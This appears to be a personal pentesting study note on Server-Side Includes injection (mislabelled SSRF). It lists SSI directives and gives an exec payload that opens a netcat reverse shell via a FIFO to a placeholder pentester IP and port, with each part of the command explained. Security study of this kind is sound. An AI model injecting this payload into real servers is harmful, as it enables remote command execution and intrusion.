---
id: 3_SSRF
created_date: 06/01/2023
updated_date: 06/01/2023
type: note
---

#  3_SSRF SERVER-SIDE INCLUDES 
- **🏷️Tags** :  #01-2023 

## 📝 Notes

Server-side includes (`SSI`) is a technology used by web applications to create dynamic content on HTML pages before loading or during the rendering process by evaluating SSI directives. Some SSI directives are:

Code: html

```html
// Date
<!--#echo var="DATE_LOCAL" -->

// Modification date of a file
<!--#flastmod file="index.html" -->

// CGI Program results
<!--#include virtual="/cgi-bin/counter.pl" -->

// Including a footer
<!--#include virtual="/footer.html" -->

// Executing commands
<!--#exec cmd="ls" -->

// Setting variables
<!--#set var="name" value="Rich" -->

// Including virtual files (same directory)
<!--#include virtual="file_to_include.html" -->

// Including files (same directory)
<!--#include file="file_to_include.html" -->

// Print all variables
<!--#printenv -->
```

The use of SSI on a web application can be identified by checking for extensions such as .shtml, .shtm, or .stm. That said, non-default server configurations exist that could allow other extensions (such as .html) to process SSI directives.

you can use the cmd command but what's better than a reverse-shell ? 

#### Reverse Shell

```html
<!--#exec cmd="mkfifo /tmp/foo;nc <PENTESTER IP> <PORT> 0</tmp/foo|/bin/bash 1>/tmp/foo;rm /tmp/foo" -->
```

-   `mkfifo /tmp/foo`: Create a FIFO special file in `/tmp/foo`
-   `nc <IP> <PORT> 0</tmp/foo`: Connect to the pentester machine and redirect the standard input descriptor
-   `| bin/bash 1>/tmp/foo`: Execute `/bin/bash` redirecting the standard output descriptor to `/tmp/foo`
-   `rm /tmp/foo`: Cleanup the FIFO file

## Questions/Thoughts
- FIFO stands for "First In, First Out." It is a type of file that works like a queue. When you add things (or "write") to the FIFO file, they are added to the end of the queue. When you take things (or "read") from the FIFO file, they are taken from the front of the queue. This means that the first thing you added to the FIFO file will be the first thing you take out.

- An example of using a FIFO file is in a ticketing system. Imagine you are at a concert and there are several ticket windows. When you buy a ticket, you go to the first available window and buy it. The first person to arrive at the concert gets the first ticket, the second person gets the second ticket, and so on. This is similar to how a FIFO file works.

## 🔗 Links
- 